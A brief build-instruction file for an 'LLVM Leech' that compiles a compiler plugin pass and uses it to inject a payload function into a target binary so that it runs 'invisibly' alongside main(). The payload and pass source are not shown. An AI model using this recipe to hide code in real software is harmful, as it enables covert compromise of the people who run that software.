
# LLVM Leech — Build Instructions (Symbolic)

## Compile the Injection Pass
clang -shared -fPIC -o leech_pass.so inject_payload_pass.cpp `llvm-config --cxxflags --ldflags --system-libs --libs all`

## Inject into Target Binary
clang -Xclang -load -Xclang ./leech_pass.so -Xclang -add-plugin -Xclang inject_payload infected_target.c leech_payload.c -o infected_bin

## Result:
Output binary executes both main() and leech_payload(), invisibly.
